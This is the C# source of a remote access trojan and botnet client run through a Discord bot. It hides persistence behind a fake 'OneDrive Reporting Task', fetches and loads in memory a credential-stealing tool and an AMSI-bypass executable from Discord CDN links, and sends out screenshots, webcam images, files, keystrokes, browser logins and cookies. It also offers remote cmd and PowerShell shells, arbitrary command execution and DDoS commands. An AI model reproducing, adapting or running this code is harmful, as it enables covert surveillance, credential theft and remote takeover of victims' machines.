using System;
using System.Drawing;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;
using System.Diagnostics;
using System.Management;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

using Discord;
using Discord.WebSocket;
using Newtonsoft.Json;
using AForge.Video.DirectShow;
using AForge.Video;

using static payload.Native;
using static payload.Globals;

namespace payload
{
    internal class Program
    {
        private static DiscordSocketClient client;
        private static string prefix;
        private static string machineid;

        private static List<string> geolock = new List<string>();

        static void Main(string[] args)
        {
            Process.Start(new ProcessStartInfo()
            {
                FileName = "powershell.exe",
                Arguments = $"-noprofile -executionpolicy bypass -command \"[System.Diagnostics.Process]::GetProcessById({Process.GetCurrentProcess().Id}).WaitForExit(); schtasks /run /i /tn 'OneDrive Reporting Task'\"",
                WindowStyle = ProcessWindowStyle.Hidden
            });

            string token = Encoding.UTF8.GetString(Convert.FromBase64String(args[0]));
            if (Uri.IsWellFormedUriString(token, UriKind.Absolute))
            {
                WebClient wc = new WebClient();
                token = Encoding.UTF8.GetString(Convert.FromBase64String(wc.DownloadString(token)));
                wc.Dispose();
            }
            prefix = args[1];
            if (args[2] != string.Empty) foreach (string item in args[2].Split(',')) geolock.Add(item.ToLower().Trim());

            if (Utils.Geocheck(geolock)) Utils.Uninfect();
            SetProcessDPIAware();
            try { Process.EnterDebugMode(); } catch { }

            Threads tds = new Threads();
            tds.Start();

            machineid = Convert.ToBase64String(Encoding.UTF8.GetBytes($"{Environment.MachineName.Substring(0, 4)}{Environment.UserName.Substring(0, 4)}{Environment.ProcessorCount}_{Utils.GetProcessorId().Substring(0, 5)}{Utils.GetMotherboardSerialNum().Substring(0, 5)}"));

            client = new DiscordSocketClient();
            client.MessageReceived += MessageReceived;
            client.LoginAsync(TokenType.Bot, token).GetAwaiter().GetResult();
            client.StartAsync().GetAwaiter().GetResult();

            Thread.Sleep(-1);
        }

        private static async Task MessageReceived(SocketMessage message)
        {
            if (message.Author.Id == client.CurrentUser.Id) return;
            if (message.Reference != null)
            {
                foreach (Shell s in shellsInstances)
                {
                    if (s.shmessage.Id == message.Reference.MessageId.Value)
                    {
                        s.SendCommand(message.Content);
                        await message.DeleteAsync();
                        return;
                    }
                }
            }
            if (prefix != string.Empty && !message.Content.StartsWith(prefix)) return;

            List<string> args = new List<string>(message.Content.Split(' '));
            string cmd = args[0].Remove(0, prefix.Length);
            args.RemoveAt(0);

            switch (cmd)
            {
                case "get":
                    {
                        string address = string.Empty;
                        string location = string.Empty;
                        try
                        {
                            // Sometimes fails, currently unsure what causes this.
                            WebClient wc = new WebClient();
                            address = wc.DownloadString("https://api.ipify.org");
                            location = JsonConvert.DeserializeObject<Dictionary<string, string>>(wc.DownloadString($"https://api.iplocation.net/?ip={address}"))["country_name"];
                            wc.Dispose();
                        }
                        catch { }

                        await message.Channel.SendMessageAsync($"Username: {Environment.UserName}\nMachine name: {Environment.MachineName}\nIP address: {address}\nIP location: {location}\nUnique ID: {machineid}");
                        break;
                    }
                case "getsc":
                    {
                        if (args[0] != machineid) break;
                        List<FileAttachment> screenshots = new List<FileAttachment>();
                        foreach (Screen screen in Screen.AllScreens)
                        {
                            Bitmap sc = new Bitmap(screen.Bounds.Width, screen.Bounds.Height);
                            Graphics sg = Graphics.FromImage(sc);
                            sg.CopyFromScreen(0, 0, 0, 0, sc.Size, CopyPixelOperation.SourceCopy);
                            sg.Dispose();

                            MemoryStream ms = new MemoryStream();
                            sc.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                            sc.Dispose();

                            screenshots.Add(new FileAttachment(ms, "unknown.png"));
                        }
                        await message.Channel.SendFilesAsync(screenshots);
                        foreach (FileAttachment fa in screenshots) fa.Dispose();
                        break;
                    }
                case "getcam":
                    {
                        if (args[0] != machineid) break;
                        List<Bitmap> images = new List<Bitmap>();
                        FilterInfoCollection devices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                        foreach (FilterInfo device in devices)
                        {
                            VideoCaptureDevice vsource = new VideoCaptureDevice(device.MonikerString);
                            vsource.NewFrame += new NewFrameEventHandler((sender, e) => { images.Add((Bitmap)e.Frame.Clone()); vsource.SignalToStop(); });
                            vsource.Start();
                            for (int i = 0; i < 10; i++) if (vsource.IsRunning) Thread.Sleep(100);
                        }
                        List<FileAttachment> pictures = new List<FileAttachment>();
                        foreach (Bitmap image in images)
                        {
                            MemoryStream ms = new MemoryStream();
                            image.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                            image.Dispose();
                            pictures.Add(new FileAttachment(ms, "unknown.png"));
                        }
                        await message.Channel.SendFilesAsync(pictures);
                        foreach (FileAttachment fa in pictures) fa.Dispose();
                        break;
                    }
                case "getfile":
                    {
                        if (args[0] != machineid) break;
                        args.RemoveAt(0);
                        string filepath = string.Join(" ", args);

                        (MemoryStream, Stream) data = Utils.CompressFile(filepath);
                        MemoryStream compressed = data.Item1;
                        Stream entrystream = data.Item2;

                        if (compressed.Length > 8000000) await message.Channel.SendMessageAsync("File too big.");
                        else await message.Channel.SendFileAsync(compressed, Path.GetFileName(filepath) + ".zip");
                        compressed.Dispose();
                        entrystream.Dispose();
                        break;
                    }
                case "getav":
                    {
                        if (args[0] != machineid) break;
                        ManagementObjectSearcher searcher = new ManagementObjectSearcher($"\\\\{Environment.MachineName}\\root\\SecurityCenter2", "SELECT * FROM AntivirusProduct");
                        List<string> instances = searcher.Get().Cast<ManagementObject>().Select(x => (string)x.GetPropertyValue("displayName")).ToList();
                        await message.Channel.SendMessageAsync($"Installed antivirus products:\n```{string.Join("\n", instances)}```");
                        searcher.Dispose();
                        break;
                    }
                case "getlogins":
                    {
                        if (args[0] != machineid) break;
                        string output = Utils.Execute("powershell.exe", "-noprofile -executionpolicy bypass -command $wc = New-Object System.Net.WebClient;$asmdata = $wc.DownloadData('https://cdn.discordapp.com/attachments/961905736139554876/967059139203309688/SharpChromium.exe');$wc.Dispose();[System.Reflection.Assembly]::Load($asmdata).EntryPoint.Invoke($null, (, [string[]] ('logins')))");
                        MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(output));
                        await message.Channel.SendFileAsync(ms, "unknown.txt", "SharpChromium output:");
                        ms.Dispose();
                        break;
                    }
                case "getcookies":
                    {
                        if (args[0] != machineid) break;
                        string output = Utils.Execute("powershell.exe", "-noprofile -executionpolicy bypass -command $wc = New-Object System.Net.WebClient;$asmdata = $wc.DownloadData('https://cdn.discordapp.com/attachments/961905736139554876/967059139203309688/SharpChromium.exe');$wc.Dispose();[System.Reflection.Assembly]::Load($asmdata).EntryPoint.Invoke($null, (, [string[]] ('cookies')))");
                        List<FileAttachment> paths = new List<FileAttachment>();
                        string[] lines = output.Split('\n');
                        foreach (string l in lines)
                        {
                            if (l.Contains("[*] All cookies written to"))
                            {
                                paths.Add(new FileAttachment(l.Substring(26).Trim()));
                            }
                        }
                        await message.Channel.SendFilesAsync(paths, "SharpChromium output:");
                        foreach (FileAttachment fa in paths) fa.Dispose();
                        break;
                    }
                case "shell":
                    {
                        if (args[0] != machineid) break;
                        Shell s = new Shell(await message.Channel.SendMessageAsync("``` ```"));
                        s.Start("cmd.exe");
                        break;
                    }
                case "powershell":
                    {
                        if (args[0] != machineid) break;
                        Shell s = new Shell(await message.Channel.SendMessageAsync("``` ```"));
                        s.Start("powershell.exe");
                        s.SendCommand("$wc = New-Object System.Net.WebClient;$asmdata = $wc.DownloadData('https://cdn.discordapp.com/attachments/961905736139554876/969797235741175838/amsibypass.exe');$wc.Dispose();[System.Reflection.Assembly]::Load($asmdata).EntryPoint.Invoke($null, $null)");
                        break;
                    }
                case "execute":
                    {
                        if (args[0] != machineid && args[0].ToLower() != "all") break;
                        args.RemoveAt(0);
                        string command = string.Join(" ", args);
                        Utils.Execute("cmd.exe", $"/c {command}");
                        await message.Channel.SendMessageAsync($"Command executed on {Environment.MachineName}");
                        break;
                    }
                case "startkeylogger":
                    {
                        if (args[0] != machineid) break;
                        logkeys = true;
                        await message.Channel.SendMessageAsync($"Keylogger started on {Environment.MachineName}");
                        break;
                    }
                case "stopkeylogger":
                    {
                        if (args[0] != machineid) break;
                        logkeys = false;
                        await message.Channel.SendMessageAsync($"Keylogger stopped on {Environment.MachineName}");
                        break;
                    }
                case "getkeylog":
                    {
                        if (args[0] != machineid) break;
                        MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(keylog));
                        await message.Channel.SendFileAsync(ms, "unknown.txt");
                        ms.Dispose();
                        keylog = string.Empty;
                        break;
                    }
                case "startddos":
                    {
                        ddos = true;
                        toddos = args[1];
                        await message.Channel.SendMessageAsync($"DDOS started on all machines.");
                        break;
                    }
                case "stopddos":
                    {
                        ddos = false;
                        toddos = string.Empty;
                        await message.Channel.SendMessageAsync($"DDOS stopped on all machines.");
                        break;
                    }
                case "uninfect":
                    {
                        if (args[0] != machineid && args[0].ToLower() != "all") break;
                        await message.Channel.SendMessageAsync($"Attempted to uninfect {Environment.MachineName}");
                        Utils.Uninfect();
                        break;
                    }
            }
        }
    }
}